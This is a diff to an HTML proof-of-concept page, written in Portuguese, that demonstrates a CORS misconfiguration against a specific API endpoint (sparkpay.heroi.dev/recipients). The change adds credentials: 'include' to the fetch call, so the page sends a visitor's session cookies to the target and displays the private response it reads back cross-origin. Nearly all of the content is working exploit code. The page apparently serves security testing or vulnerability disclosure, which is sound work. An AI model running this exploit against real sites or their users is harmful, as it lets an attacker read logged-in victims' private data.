@@ -2,10 +2,11 @@
 <html lang="pt-BR">
   <head>
     <meta charset="UTF-8">
-    <title>CORS PoC – Leitura Cross-Origin</title>
+    <title>CORS PoC</title>
   </head>
   <body>
-    <h2>PoC 1 – CORS Excessivamente Permissivo</h2>
+    <h2>Prova de Conceito – CORS Misconfiguration</h2>
+    <p>Esta página está sendo servida via GitHub Pages.</p>
 
     <button onclick="exploit()">Executar PoC</button>
 
@@ -14,12 +15,13 @@
     <script>
       function exploit() {
         fetch("https://sparkpay.heroi.dev/recipients", {
-          method: "GET"
+          method: "GET",
+          credentials: "include"
         })
         .then(response => response.text())
         .then(data => {
           document.getElementById("result").innerText =
-            "Resposta da API lida a partir de um domínio externo:\n\n" + data;
+            "Resposta obtida da aplicação alvo:\n\n" + data;
         })
         .catch(error => {
           document.getElementById("result").innerText =
